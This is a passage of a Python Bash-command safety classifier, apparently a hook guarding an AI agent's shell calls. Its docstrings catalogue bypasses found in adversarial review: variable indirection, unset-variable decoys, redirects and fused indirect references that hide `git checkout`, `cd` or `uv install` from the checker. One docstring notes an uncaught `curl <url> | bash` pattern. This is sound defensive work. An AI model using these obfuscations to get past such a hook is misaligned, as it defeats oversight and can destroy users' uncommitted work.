    already establishes that an ambiguous "is this actually git" question
    here declines to resolve rather than assumes the worst (see its own
    "genuinely ambiguous... this pure classifier declines to resolve"
    paragraph, for the analogous ambiguous-token-after-`git` case this
    mirrors for the `git` token itself).

    CRITICAL bug found by independent adversarial review (round 14, issue
    #1375) and independently reproduced live: `_find_git_checkout_
    restore`'s own outer scan only ever recognized a LITERAL `git` token
    -- `G=git; $G checkout -- dirty.py` resolved to an empty, wrong
    `checkout_restore_paths` even though `$G` unambiguously resolves to
    `git`. Live-verified this genuinely runs `git checkout -- dirty.py`
    once bash resolves it. Reuses `_substitute_var_refs_candidates`
    exactly like `_dynamic_word_may_resolve_to_a_cwd_relocator` does for
    the analogous cd/pushd/popd question, but requires EVERY candidate
    reading to match LITERAL (not just one), the mirror-image of that
    function's OR-based check -- appropriate here because a false
    positive in THIS position risks a wrong `checkout_restore_paths`
    CLAIM about an unrelated tool, while that function's own false
    positive would only over-deny (the safer direction)."""
    if _VAR_REF_FULL_RE.search(token) is None:
        return False
    candidates = _substitute_var_refs_candidates(token, name_to_raw_value, name_to_raw_value)
    if candidates is None or not candidates:
        return False
    return all(candidate.lower() == literal for candidate in candidates)


def _find_git_checkout_restore(seg: list[str], name_to_raw_value: dict[str, str]) -> tuple[str | None, list[str], bool]:
    """Scan SEG (already assignment-stripped, see `_strip_leading_
    assignments`) for a `git checkout`/`git restore` invocation, skipping
    past git's own global value-taking options the same way
    `_is_git_push_segment` skips past them to find `push` -- but
    CASE-SENSITIVELY for the `-C`/`-c` distinction (issue #1375's own Fact
    5: only uppercase `-C`, not lowercase `-c`, relocates which working
    tree git operates against; `-c` only sets a config value).

    Scans for a literal `git` token at ANY position in SEG, not just
    `seg[0]` -- like `_is_git_push_segment`'s own scan, not anchored to
    position 0. A `for VAR in ...; do ...; done` loop is one, real,
    non-honest-accident-shaped reason this matters: bash's `for`/`do`/
    `done`/`in` keywords are not shell control operators, so
    `segment_tokens` never splits a segment at them, and `git checkout --
    "$f"` sitting after a literal `do` would never be found at `seg[0]`.
    Confirmed live during this function's own development that a
    seg[0]-anchored version of this scan let `for f in $(git diff
    --name-only); do git checkout -- "$f"; done` (this module's own
    Acceptance Criteria Map names this exact shape) through with an empty
    `checkout_restore_paths` instead of denying on the unresolvable `$f`.

    A DYNAMIC token encountered while skip-parsing global flags is
    resolved via `_token_is_all_unassigned_refs` (the same primitive
    `_is_git_push_segment` already uses for the identical position) rather
    than always treated as ambiguous: a token that unambiguously vanishes
    at real bash runtime (a genuinely unset, unquoted `$NEVERSET`-shaped
    reference) is skipped over, not given up on. Found live by
    independent adversarial review of this PR: `git $NEVERSET checkout --
    file.py` (NEVERSET never assigned) was wrongly allowed with an empty
    `checkout_restore_paths` before this check -- confirmed live via a
    real bash proxy (stand-in `git` binary on PATH, capturing its own
    argv) that the decoy word-splits away to nothing and this genuinely
    runs `git checkout -- file.py`, silently bypassing the whole feature
    with one trivial unset variable. A dynamic token that does NOT
    unambiguously vanish (assigned, or an indirect/default-clause
    reference this primitive does not cover) still makes this `git`
    occurrence ambiguous, per the paragraph below.

    Returns `(subcommand, tokens_after_subcommand,
    saw_tree_relocation_flag)`; `subcommand` is `None` when SEG has no
    checkout/restore invocation at all (including when a dynamic token
    sits in a position that could be either a global flag/value or the
    subcommand itself, immediately after a literal `git`, and does not
    unambiguously vanish -- a genuinely ambiguous, non-honest-accident
    shape this pure classifier declines to resolve at that specific `git`
    occurrence, the same disclosed-residual convention this module's own
    `KNOWN_BYPASS_COMMANDS` test list already uses for the analogous
    dynamic-tool/dynamic-verb case; scanning continues past it to any
    later `git` occurrence in the same segment), in which case the other
    two return values are meaningless.

    A DYNAMIC `tok` that unambiguously resolves to `git` (per
    `_dynamic_token_resolves_only_to_literal`, see its own docstring) is
    ALSO recognized as this `git` occurrence -- CRITICAL bug found by
    independent adversarial review (round 14, issue #1375) and
    independently reproduced live: `G=git; $G checkout -- dirty.py`
    resolved to an empty, wrong `checkout_restore_paths` before this fix,
    even though `$G` unambiguously resolves to `git` and this genuinely
    runs `git checkout -- dirty.py` once bash resolves it. An ambiguous
    or unresolvable dynamic `tok` still declines here (returns to the
    outer scan without treating it as `git`), the same "decline, don't
    assume" posture already established above for an ambiguous token
    AFTER a literal `git`.

    The flag-skip loop below also skips a redirect clause
    (`_redirect_span_length`, see its own docstring) wherever it would
    otherwise land -- CRITICAL bug found by independent adversarial
    review (round 14, issue #1375) and independently reproduced live:
    `git > /dev/null checkout -- dirty.py` (fully literal, no dynamic
    content at all) resolved to an empty, wrong `checkout_restore_paths`
    before this fix, since the redirect operator token itself was
    mistaken for the subcommand position and the scan gave up there."""
    n = len(seg)
    for i, tok in enumerate(seg):
        if _is_dynamic(tok):
            if not _dynamic_token_resolves_only_to_literal(tok, name_to_raw_value, "git"):
                continue
        elif tok.lower() != "git":
            continue
        saw_tree_relocation = False
        j = i + 1
        ambiguous = False
        while j < n:
            candidate = seg[j]
            if _is_dynamic(candidate):
                if _token_is_all_unassigned_refs(
                    candidate, name_to_raw_value
                ) or _token_is_a_vanishing_default_or_alt_clause(candidate, name_to_raw_value):
                    j += 1
                    continue
                ambiguous = True
                break
            redirect_len = _redirect_span_length(seg, j)
            if redirect_len:
                j += redirect_len
                continue
            if (
                candidate == "-C"
                or candidate in _GIT_TREE_RELOCATION_LONG_FLAGS
                or any(candidate.startswith(f"{flag}=") for flag in _GIT_TREE_RELOCATION_LONG_FLAGS)
            ):
                saw_tree_relocation = True
            if not candidate.startswith("-"):
                break
            flag_bare = candidate.split("=", 1)[0]
            j += 1
            if "=" not in candidate and (
                flag_bare in _GIT_GLOBAL_SHORT_VALUE_FLAGS or flag_bare in _GIT_LONG_VALUE_FLAGS
            ):
                j += 1
        if ambiguous:
            continue
        if j < n and seg[j] in ("checkout", "restore"):
            return seg[j], seg[j + 1 :], saw_tree_relocation
    return None, [], False


_CWD_RELOCATING_COMMANDS = {"cd", "pushd", "popd"}


def _dynamic_word_may_resolve_to_a_cwd_relocator(token: str, name_to_raw_value: dict[str, str]) -> bool:
    """Whether a DYNAMIC command word (already confirmed non-vanishing by
    the caller) could plausibly resolve, at real bash runtime, to a
    literal `cd`/`pushd`/`popd` -- narrower than round 10's own original
    fix, which flagged EVERY non-vanishing dynamic `seg[0]` regardless of
    what it could actually resolve to.

    CRITICAL false-positive bug found by independent adversarial review
    (round 11, issue #1375) and independently reproduced live: round 10's
    blanket flag denied `EDITOR=vim; $EDITOR sub; git checkout -- f.py`
    outright -- a completely safe, ordinary command (an `$EDITOR`/`$TOOL`/
    positional-parameter dispatch idiom, followed by an unrelated, clean
    checkout) -- purely because `$EDITOR` is dynamic and does not vanish,
    with no attempt to check what it could actually resolve to. This is
    the same over-broad "deny every dynamic word" policy this module's
    own opening docstring already measured at a 28% false-positive rate
    and rejected everywhere else; round 10 had reintroduced it in this one
    narrow spot.

    Resolves TOKEN via `_substitute_var_refs_candidates`, reusing it with
    NAME_TO_RAW_VALUE passed as BOTH of that function's parameters (rather
    than the module's usual lowercased `name_to_value`) so every candidate
    stays case-PRESERVED -- `cd`/`pushd`/`popd` are real bash command
    names, case-SENSITIVE unlike the write-method literals every other
    caller of that primitive compares case-insensitively; lowercasing here
    would make an assignment like `X=CD` (which real bash would try to run
    as literal, non-existent command `CD`, not the `cd` builtin) a false
    positive of its own.

    Four cases:
    - No `$NAME`-shaped reference found in TOKEN at all
      (`_VAR_REF_FULL_RE.search` finds nothing) -- TOKEN's dynamism comes
      from something this resolution primitive cannot decompose (e.g. a
      folded command-substitution placeholder). Fails closed (`True`),
      preserving round 10's own blanket-flag behavior for this shape
      exactly -- this function only ever NARROWS what round 10 already
      flagged, never widens it.
    - `_substitute_var_refs_candidates` returns `None` (too many candidate
      readings to enumerate) or `[]` (some referenced name has no
      assigned-and-in-range reading this classifier can resolve) -- both
      genuine ambiguity, not a resolved-safe value. Fails closed (`True`).
    - A returned candidate is ITSELF still dynamic (contains `$`/backtick
      after substitution) -- CRITICAL bypass found by independent
      adversarial review (round 12, issue #1375) and independently
      reproduced live: `_substitute_var_refs_candidates` does NOT
      recursively re-expand a `${NAME:-default}` clause's own DEFAULT
      text (a disclosed residual of that primitive itself, see its own
      docstring), so `OTHER=cd; ${UNSET:-$OTHER} sub; git checkout --
      dirty.py` resolved `${UNSET:-$OTHER}`'s one candidate to the
      literal, still-unexpanded string `"$OTHER"` -- never equal to
      `cd`/`pushd`/`popd` as plain text, even though `$OTHER` genuinely
      holds `cd` at real bash runtime -- silently discarding uncommitted
      work exactly like round 10's own original bypass. Fails closed
      (`True`), mirroring the identical still-dynamic-candidate check
      `_resolve_path_tokens` already carries for the same reason (see its
      own docstring).
    - A concrete, fully-resolved candidate list -- flags (`True`) only if
      some candidate is exactly `cd`/`pushd`/`popd`; otherwise the word
      demonstrably resolves to something else, so returns `False`."""
    if _VAR_REF_FULL_RE.search(token) is None:
        return True
    candidates = _substitute_var_refs_candidates(token, name_to_raw_value, name_to_raw_value)
    if candidates is None or not candidates or any(_is_dynamic(candidate) for candidate in candidates):
        return True
    return any(candidate in _CWD_RELOCATING_COMMANDS for candidate in candidates)


def _first_surviving_segment_word(seg: list[str], name_to_raw_value: dict[str, str]) -> str | None:
    """The first token of SEG that would actually survive as bash's real
    command word once every LEADING vanishing decoy -- a bare/braced
    unassigned reference (`_token_is_all_unassigned_refs`) or an
    empty-default/alt-value clause (`_token_is_a_vanishing_default_or_
    alt_clause`) -- has word-split away to nothing. `None` if the whole
    leading run (up to and including every token in SEG) vanishes.

    CRITICAL bug found by independent adversarial review (round 13, issue
    #1375) and independently reproduced live: `_rule_git_checkout_restore`
    only ever checked `seg[0]` itself for a possible cwd-relocator, the
    same way `_find_git_checkout_restore` checks `seg[0]` for the git/
    subcommand-position question -- but when `seg[0]` genuinely vanishes,
    the classifier already knows (per this module's own established
    convention, e.g. `_strip_leading_unassigned_bare_refs`'s use in
    `_classify_tokens`'s own `collapsed_segments` pass) that whatever
    token follows becomes the REAL command word at real bash runtime, and
    that word was never itself checked here. Confirmed live: `X=cd;
    $NEVERSET $X sub; git checkout -- dirty.py` (`NEVERSET` genuinely
    never assigned) -- `$NEVERSET` vanishes, so the previous `seg[0]`-only
    check silently skipped the whole segment, even though `$X` (which
    resolves to `cd`) is what bash actually runs first. Real bash
    (confirmed via an argv-capturing `cd` proxy) genuinely executes `cd
    sub` there. Same result for `X=pushd` and for a vanishing
    `${NEVERSET:-}` decoy in place of the bare `$NEVERSET`.

    Callers should feed the RESULT of this function to
    `_dynamic_word_may_resolve_to_a_cwd_relocator` (when dynamic) or the
    existing literal `_CWD_RELOCATING_COMMANDS` membership check (when
    not), exactly like they would have used `seg[0]` directly before this
    fix -- this function only changes WHICH token that check runs
    against, never the check itself.

    Also skips a leading redirect clause (`_redirect_span_length`, see
    its own docstring) -- CRITICAL bug found by independent adversarial
    review (round 14, issue #1375) and independently reproduced live:
    `X=cd; > /dev/null $X sub; git checkout -- dirty.py` resolved to a
    confident, wrong ALLOW before this fix, since the redirect made this
    walk return the `>` operator token itself (neither vanishing nor
    dynamic) as the "surviving word," so the real, cd-resolving `$X` one
    position later was never checked. A vanishing decoy and a redirect
    clause may interleave in either order (`$NEVERSET > /dev/null $X
    sub`), so both skips run in the SAME loop until neither applies."""
    i = 0
    n = len(seg)
    while i < n:
        if _token_is_all_unassigned_refs(seg[i], name_to_raw_value) or _token_is_a_vanishing_default_or_alt_clause(
            seg[i], name_to_raw_value
        ):
            i += 1
            continue
        redirect_len = _redirect_span_length(seg, i)
        if redirect_len:
            i += redirect_len
            continue
        break
    return seg[i] if i < n else None


def _rule_git_checkout_restore(
    segments: list[list[str]], raw_assigned: dict[str, str]
) -> tuple[str | None, tuple[str, ...]]:
    """Extract every `checkout_restore_paths` candidate across every
    segment of one command, denying outright on any segment where this
    classifier cannot soundly determine which working tree is at risk: a
    `-C`/`--git-dir`/`--work-tree` global flag on the checkout/restore
    segment itself, a `GIT_DIR=`/`GIT_WORK_TREE=`/`GIT_INDEX_FILE=`
    assignment anywhere in the command, or a literal `cd`/`pushd`/`popd`
    in an earlier segment of the same command. hooks/check-bash-safety.sh's
    own new wrapper step always checks a path against `.cwd` from the
    PreToolUse payload (issue #1375's own Fact 5, the cwd-mismatch
    finding) -- any of these makes that single, fixed `.cwd` reference
    point unsound for this particular invocation, so this denies here
    (I/O-free -- a token-shape fact, not a live check) rather than letting
    the wrapper check the wrong tree.

    `pushd`/`popd` join `cd` in `_CWD_RELOCATING_COMMANDS` -- CRITICAL bug
    found by independent adversarial review (round 9, issue #1375) and
    independently reproduced live: only a literal `cd` token was
    recognized here, but `pushd <dir>` relocates the shell's own working
    directory exactly like `cd` does (confirmed live: `pushd sub &&
    git checkout -- dirty.py`, with `dirty.py` dirty relative to `sub`
    but absent at the PreToolUse payload's own `.cwd`, resolved
    `checkout_restore_paths` to `('dirty.py',)` -- a CONFIDENT, WRONG
    claim, since the wrapper's live `git diff` check against that
    filename at the wrong `.cwd` found no such path and reported clean --
    and the real command silently discarded the uncommitted change when
    actually executed). `popd` joins for the same reason: it also
    relocates the shell's cwd, to whatever the directory stack's own
    prior entry was, which this classifier has no way to know either.

    A DYNAMIC command word at `seg[0]` (after `_classify_tokens`'s own
    uniform `_strip_leading_assignments`, so `seg[0]` is always the real
    command word here) that does not unambiguously vanish, AND could
    plausibly resolve to `cd`/`pushd`/`popd`, is ALSO treated as a
    possible relocator -- CRITICAL bug found by independent adversarial
    review (round 10, issue #1375) and independently reproduced live: the
    literal-token scan above only ever recognized `cd`/`pushd`/`popd`
    written out directly, so `X=cd; $X sub; git checkout -- file.py`
    (dirty relative to `sub`, absent at the PreToolUse payload's own
    `.cwd`) resolved to the same CONFIDENT, WRONG `checkout_restore_paths`
    claim round 9's fix closed for the literal case, and the real command
    silently discarded the uncommitted change when actually executed;
    same result for `X=pushd`. A token that unambiguously vanishes
    (`_token_is_all_unassigned_refs`/`_token_is_a_vanishing_default_or_
    alt_clause`, the same primitives `_find_git_checkout_restore` already
    uses for the identical git/subcommand-position question) is NOT
    flagged here, since real bash then runs whatever token follows as the
    actual command word instead -- and the existing literal scan above,
    which checks every token in the segment regardless of position,
    already covers a literal `cd`/`pushd`/`popd` sitting after such a
    decoy without this addition needing its own skip-past loop.

    Round 10's own first version flagged EVERY non-vanishing dynamic
    `seg[0]`, with no attempt to check what it could actually resolve to
    -- CRITICAL false-positive bug found by independent adversarial review
    (round 11, issue #1375) and independently reproduced live:
    `EDITOR=vim; $EDITOR sub; git checkout -- f.py`, a completely safe,
    ordinary command with an unrelated, clean checkout, was denied
    outright purely because `$EDITOR` is dynamic and non-vanishing.
    `_dynamic_word_may_resolve_to_a_cwd_relocator` narrows this to
    actually resolve the word's candidate value(s) (see its own
    docstring) and only flags when a candidate could genuinely be
    `cd`/`pushd`/`popd`, or resolution is itself ambiguous/unresolvable --
    never widening beyond what round 10 already flagged, only narrowing
    it.

    The dynamic-word check above runs against `_first_surviving_segment_
    word(seg, raw_assigned)`, not `seg[0]` directly -- CRITICAL bug found
    by independent adversarial review (round 13, issue #1375) and
    independently reproduced live: a `seg[0]`-only check silently skips
    the whole segment when `seg[0]` itself genuinely vanishes, even
    though the token that actually survives to become bash's real command
    word (per that same vanishing logic this function already trusts
    elsewhere) was never itself checked. `X=cd; $NEVERSET $X sub; git
    checkout -- dirty.py` (`NEVERSET` genuinely never assigned) resolved
    to the same CONFIDENT, WRONG `checkout_restore_paths` claim every
    earlier round in this area has closed for a different gap -- see
    `_first_surviving_segment_word`'s own docstring for the full
    reproduction. The literal scan above is unaffected: it already checks
    every token in the segment regardless of position, so a literal
    `cd`/`pushd`/`popd` sitting after a vanishing decoy was already
    covered."""
    saw_cd = False
    all_paths: list[str] = []
    for seg in segments:
        subcommand, tokens_after, saw_tree_relocation = _find_git_checkout_restore(seg, raw_assigned)
        if subcommand is None:
            first = _first_surviving_segment_word(seg, raw_assigned)
            if any(not _is_dynamic(t) and t in _CWD_RELOCATING_COMMANDS for t in seg) or (
                first is not None
                and _is_dynamic(first)
                and _dynamic_word_may_resolve_to_a_cwd_relocator(first, raw_assigned)
            ):
                saw_cd = True
            continue
        if saw_tree_relocation or saw_cd or any(name in raw_assigned for name in _GIT_TREE_ENV_VARS):
            return (
                f"a 'git {subcommand}' command carries a -C/--git-dir/--work-tree flag, a GIT_DIR=/"
                "GIT_WORK_TREE=/GIT_INDEX_FILE= assignment, or an earlier 'cd'/'pushd'/'popd' in the same "
                "command -- this classifier cannot soundly determine which working tree is at risk, so this "
                "is denied outright",
                (),
            )
        if subcommand == "checkout":
            deny_reason, paths = _git_checkout_paths(tokens_after, raw_assigned)
        else:
            deny_reason, paths = _git_restore_paths(tokens_after, raw_assigned)
        if deny_reason:
            return deny_reason, ()
        all_paths.extend(paths)
    return None, tuple(all_paths)


def _resolve_seg_tokens_candidates(
    tokens: list[str], name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> set[str] | None:
    """Resolve every DYNAMIC token in TOKENS via
    `_substitute_var_refs_candidates`, collecting every candidate reading
    (lowercased) into one set -- a literal token contributes nothing here;
    a caller that wants literal tokens included seeds its own set with
    them first. Returns `None` if any dynamic token's own candidate set is
    too large to enumerate soundly -- fail closed, the same posture every
    caller of `_substitute_var_refs_candidates` already takes
    individually. Factored out here since B1a and B1b below (and the
    self-contained duplicate's own B1a/B1b/`_rule_git_push`) had each
    grown a byte-identical copy of this loop. Found by Step 8 independent
    review, twelfth round (issue #1326)."""
    values: set[str] = set()
    for tok in tokens:
        if not _is_dynamic(tok):
            continue
        candidates = _substitute_var_refs_candidates(tok, name_to_value, name_to_raw_value)
        if candidates is None:
            return None
        values.update(candidate.lower() for candidate in candidates)
    return values


def _rule_b1a_dynamic_word_same_segment_verb(
    seg: list[str], verb_set: set[str], name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> bool:
    """A segment whose command word is dynamic, with a watched-verb token
    present anywhere else in that SAME segment (e.g. `$T install foo` --
    `install` sits right there, and `$T in${!SUFNAME} foo` -- `install`
    is a FUSED reconstruction of a literal prefix plus a resolved
    reference). Scoped to one segment on purpose, so it cannot combine
    with an unrelated verb-shaped word in a different, unrelated segment.

    Resolves every dynamic token via `_substitute_var_refs_candidates`
    (bare reference, default clause, or `${!NAME}` indirect reference,
    including any of those FUSED with surrounding literal text in the
    same token) rather than the narrower, whole-token-anchored
    `_default_clause_literal`/`_resolve_indirect_ref` this rule used
    directly through the ninth and tenth rounds. Found live by Step 8
    independent review, eleventh round (issue #1326): both of those
    anchored helpers require the ENTIRE token to be exactly one
    construct, so a verb reconstructed by fusing literal text with a
    default-clause or indirect reference in the SAME token --
    `T=uv; $T in${!SUFNAME} foo` where `SUFNAME` resolves (two levels)
    to `stall` -- resolves, at real bash's own runtime (confirmed via
    `bash -c` argv expansion), to a genuine `uv install foo`, but
    contributed NOTHING to this rule's own verb collection before this
    fix, since neither helper's anchored `^...$` match could ever fire
    on a token with extra literal text fused onto the construct. Any
    candidate set too large to enumerate soundly (see
    `_MAX_SUBSTITUTION_CANDIDATES`) is treated as an unresolved-but-
    plausible match -- fail closed, the same posture
    `_write_method_candidate_hit` already takes for the gh-api-write
    path this same substitution primitive already served."""
    if not seg or not _is_dynamic(seg[0]):
        return False
    literals = {t.lower() for t in seg[1:] if not _is_dynamic(t)}
    resolved = _resolve_seg_tokens_candidates(seg[1:], name_to_value, name_to_raw_value)
    if resolved is None:
        return True
    return bool((literals | resolved) & verb_set)


def _rule_b1b_dynamic_word_assigned_tool_and_verb(
    seg: list[str], name_to_value: dict[str, str], verb_set: set[str], name_to_raw_value: dict[str, str]
) -> bool:
    """A segment with at least one dynamic token, where the segment's own
    dynamic tokens, once resolved, together supply both a watched tool
    name and a watched verb name (e.g. `A=uv; B=install; $A $B foo` --
    both `$A` and `$B` are dynamic tokens in the SAME segment, resolving
    to "uv" and "install" respectively).

    Resolves every dynamic token via `_substitute_var_refs_candidates`
    (bare reference, default clause, or `${!NAME}` indirect reference,
    including any of those FUSED with surrounding literal text in the
    same token, e.g. `in${!SUFNAME}` reconstructing to "install") --
    scoped to what THIS segment's own dynamic tokens actually resolve to,
    not "some assignment anywhere in the whole command happens to look
    like a tool and some unrelated assignment happens to look like a
    verb," which is unsound: found live by Step 8 independent review
    (issue #1326), `TOOL=uv; VERB=install; echo done; X=$(mktemp); "$X"
    --help` was wrongly denied even though `$X` references neither TOOL
    nor VERB.

    `seg[0]` (the command word) must itself be dynamic, or a dynamic
    argument to an otherwise-literal, harmless command (e.g. `echo $A $B`
    where A=uv, B=install just prints text, it does not invoke anything)
    would be denied for constructing no dynamic command at all.

    Found live by Step 8 independent review, eleventh round (issue
    #1326): the prior version's narrower, whole-token-anchored
    `_default_clause_literal`/`_resolve_indirect_ref` calls (plus a
    separate, similarly unanchored-but-narrower `_VAR_REF_RE`-based
    bare-reference collection) each required the ENTIRE token to be
    exactly one recognized construct -- a verb or tool reconstructed by
    fusing literal text with a default-clause or indirect reference in
    the SAME token (`T=uv; $T in${!SUFNAME} foo`, `SUFNAME` resolving two
    levels to "stall") resolves, at real bash's own runtime (confirmed
    via `bash -c` argv expansion), to a genuine `uv install foo`, but
    contributed NOTHING to any of those three collection mechanisms.
    `_substitute_var_refs_candidates` already handles every one of those
    reference shapes -- fused or not -- uniformly, so this rule (like
    B1a above) now calls it directly instead of re-deriving a narrower
    subset of the same resolution logic. Any candidate set too large to
    enumerate soundly is treated as an unresolved-but-plausible match --
    fail closed, matching B1a's own posture."""
    if not seg or not _is_dynamic(seg[0]):
        return False
    values = _resolve_seg_tokens_candidates(seg, name_to_value, name_to_raw_value)
    if values is None:
        return True
    return bool(values & _WATCHED_TOOLS) and bool(values & verb_set)


def _rule_b2_watched_tool_dynamic_verb_position(seg: list[str]) -> bool:
    """A literal watched-tool command word whose very next argument (the
    position a subcommand/verb normally occupies) is dynamically
    constructed (e.g. `uv $x foo`, `set -- install foo; uv "$@"`).

    `git` is deliberately excluded here: it has many safe subcommands
    (status, commit, log, diff, add, ...) and the one this gate cares
    about (push) is warn-not-deny, handled by the dedicated git-push
    detection below -- folding git into this generic hard-deny rule would
    deny `git $SUBCMD ...` regardless of which subcommand actually
    resolves, a false-positive class this gate does not need to take on
    since push already has its own, narrower path."""
    if len(seg) < 2:
        return False
    first = seg[0]
    if _is_dynamic(first) or first.lower() not in (_WATCHED_TOOLS - {"git"}):
        return False
    return _is_dynamic(seg[1])


def _segment_loop_hit(
    segments: list[list[str]], name_to_value: dict[str, str], name_to_raw_value: dict[str, str]
) -> tuple[str | None, bool]:
    """The B1a/B1b/B2/obfuscated-git-push-second-token loop -- factored
    out of `_classify_tokens` so it can be run TWICE: once against
    SEGMENTS as-is, once against a COLLAPSED reading with each segment's
    own leading run of vanishing references additionally stripped (see
    `_classify_tokens`'s own docstring for why). Every check inside this
    loop is anchored to a fixed POSITION within a segment -- `seg[0]`
    (B2, the obfuscated-git-push check) or, for B1a/B1b, `seg[0]` must
    itself be dynamic before either even runs -- unlike `_rule_a_literal`/
    `_rule_gh_api_write` (each a whole-segment/whole-command literal-
    content scan, confirmed live immune to a leading decoy by
    construction, so neither needs this second pass), a position-anchored
    check can be defeated by a leading token that word-splits away to
    nothing at real bash runtime.

    Found live by Step 8 independent review, twenty-first round (issue
    #1326): `$NEVERSET uv $VERB` (NEVERSET never assigned) was wrongly
    ALLOWED -- B2 requires a LITERAL `seg[0]` naming a watched tool, and
    `$NEVERSET` sitting there blocked it from ever firing, regardless of
    what followed. `curl <url> | $NEVERSET bash`-shaped constructions were
    considered too, but this module has no fetch-exec-piped-to-interpreter
    rule at all (confirmed live: even a plain `curl <url> | bash` with no
    decoy already classifies "no denied pattern matched" here), so there
    is no equivalent gap for that shape in this file specifically -- only
    B2's own literal-`seg[0]` requirement is affected."""
    is_git_push = False
    for seg in segments:
        if _rule_b1a_dynamic_word_same_segment_verb(seg, _WATCHED_VERBS, name_to_value, name_to_raw_value):
            return (
                "a Bash command word is dynamically constructed, alongside a denied verb literally "
                "present in the same command -- rewrite as a plain literal command so it can be checked",
                is_git_push,
            )
        if _rule_b1b_dynamic_word_assigned_tool_and_verb(seg, name_to_value, _WATCHED_VERBS, name_to_raw_value):
            return (
                "a Bash command word is dynamically constructed from variables whose assigned values "
                "include both a denied tool and a denied verb -- rewrite as a plain literal command",
                is_git_push,
            )
        if _rule_b2_watched_tool_dynamic_verb_position(seg):
            return (
                "a watched tool is invoked with a dynamically constructed subcommand/verb argument -- "
                "rewrite as a plain literal command so it can be checked",
                is_git_push,
            )
        obfuscated_git_push_second_token = (
            seg and not _is_dynamic(seg[0]) and seg[0].lower() == "git" and len(seg) > 1 and _is_dynamic(seg[1])
        )
        if (
            _rule_b1a_dynamic_word_same_segment_verb(seg, {_GIT_PUSH_VERB}, name_to_value, name_to_raw_value)
            or _rule_b1b_dynamic_word_assigned_tool_and_verb(seg, name_to_value, {_GIT_PUSH_VERB}, name_to_raw_value)
            or obfuscated_git_push_second_token
        ):
            is_git_push = True
    return None, is_git_push


def classify(command: str) -> Verdict:
    """Classify one Bash tool_input.command string. Fails closed (deny) on
    anything shlex cannot tokenize -- an unparseable command is exactly the
    "cannot confidently classify" case dimension 15 requires denying, not
    silently allowing."""
    try:
        tokens = tokenize(command)
    except TokenizeError as error:
        return Verdict(True, f"the command could not be parsed as shell syntax ({error}). Failing closed", False)
    return _classify_tokens(tokens)


def _classify_tokens(
    tokens: list[str],
    outer_name_to_value: dict[str, str] | None = None,
    outer_name_to_raw_value: dict[str, str] | None = None,
) -> Verdict:
    """The token-level core of `classify` -- split out so `_rule_command_
    substitution_content` can recurse into a `$(...)` span's own inner
    tokens directly, without a lossy token-list-to-string-and-back round
    trip through `tokenize` again. `classify` (the module's public,
    string-based entry point) is a thin wrapper around this. Reconstructs
    `lowered_command` from TOKENS (`" ".join(tokens).lower()`) rather than
    receiving the original source string -- a recursive call has no
    original string, only the inner span's own tokens; the graphql-
    mutation-keyword check this feeds is already a disclosed, best-effort
    substring residual (see `_rule_gh_api_write`'s own docstring), not a
    sound one this reconstruction could meaningfully weaken further.

    OUTER_NAME_TO_VALUE/OUTER_NAME_TO_RAW_VALUE, when given, are a
    caller-supplied pair MERGED into whatever TOKENS's own assignments
    resolve to (TOKENS's own assignments win on a name collision -- an
    inner-scope reassignment does shadow the outer one). Named to match
    every other function in this module that takes this same pair
    (`name_to_value`/`name_to_raw_value`), not a new vocabulary of their
    own. Used only by `_rule_array_literal_content`'s own recursive call,
    to give an array literal's own inner content access to the SAME
    shell scope as the rest of the command (see that function's own
    docstring, nineteenth-round paragraph, for the live bypass this
    closes) -- `None` (every other caller, including the top-level
    `classify` and `_rule_command_substitution_content`'s own recursive
    calls -- see that function's own docstring for the disclosed residual
    this leaves there) preserves this function's prior, scope-free
    behavior exactly."""
    outer_literals = outer_name_to_value or {}
    outer_raw = outer_name_to_raw_value or {}

    content_reason, content_is_git_push, content_checkout_restore_paths = _rule_command_substitution_content(tokens)
    if content_reason:
        return Verdict(True, content_reason, content_is_git_push, content_checkout_restore_paths)

    array_content_reason, array_content_is_git_push, array_content_checkout_restore_paths = _rule_array_literal_content(
        tokens,
        {**outer_literals, **_assigned_literals(tokens)},
        {**outer_raw, **_assigned_raw_values(tokens)},
    )
    is_git_push = content_is_git_push or array_content_is_git_push
    checkout_restore_paths = content_checkout_restore_paths + array_content_checkout_restore_paths
    if array_content_reason:
        return Verdict(True, array_content_reason, is_git_push, checkout_restore_paths)

    tokens = _fold_array_literal_spans(_fold_command_substitution_spans(tokens))
    segments = [s for s in (_strip_leading_assignments(seg) for seg in segment_tokens(tokens)) if s]
    assigned = {**outer_literals, **_assigned_literals(tokens)}
    raw_assigned = {**outer_raw, **_assigned_raw_values(tokens)}
    lowered_command = " ".join(tokens).lower()

    is_git_push = is_git_push or any(_is_git_push_segment(seg, raw_assigned) for seg in segments)

    literal_hit = _rule_a_literal(segments)
    if literal_hit:
        return Verdict(True, literal_hit, is_git_push, checkout_restore_paths)

    gh_api_hit = _rule_gh_api_write(segments, lowered_command, assigned, raw_assigned)
    if gh_api_hit:
        return Verdict(True, gh_api_hit, is_git_push, checkout_restore_paths)

    loop_hit, loop_is_git_push = _segment_loop_hit(segments, assigned, raw_assigned)
    is_git_push = is_git_push or loop_is_git_push
    if loop_hit:
        return Verdict(True, loop_hit, is_git_push, checkout_restore_paths)

    collapsed_segments = [
        collapsed for seg in segments if (collapsed := _strip_leading_unassigned_bare_refs(seg, raw_assigned))
    ]
    if collapsed_segments != segments:
        collapsed_hit, collapsed_is_git_push = _segment_loop_hit(collapsed_segments, assigned, raw_assigned)
        is_git_push = is_git_push or collapsed_is_git_push
        if collapsed_hit:
            return Verdict(
                True,
                f"{collapsed_hit}, once a leading unassigned reference word-split away",
                is_git_push,
                checkout_restore_paths,
            )

    own_checkout_restore_hit, own_checkout_restore_paths = _rule_git_checkout_restore(segments, raw_assigned)
    checkout_restore_paths = checkout_restore_paths + own_checkout_restore_paths
    if own_checkout_restore_hit:
        return Verdict(True, own_checkout_restore_hit, is_git_push, checkout_restore_paths)

    return Verdict(False, "no denied pattern matched", is_git_push, checkout_restore_paths)


# --- stdin JSON entrypoint ------------------------------------------------


def _fail_closed(message: str) -> None:
    print(json.dumps({"decision": "deny", "reason": message}))


def main() -> int:
    raw = sys.stdin.buffer.read()
    try:
        payload = json.loads(raw.decode("utf-8"))
    except (json.JSONDecodeError, UnicodeDecodeError) as error:
        _fail_closed(f"the tool-call payload on stdin is not valid JSON ({error}). Failing closed")
        return 0
    if not isinstance(payload, dict):
        _fail_closed("the tool-call payload on stdin is not a JSON object. Failing closed")
        return 0

    tool_name = payload.get("tool_name")
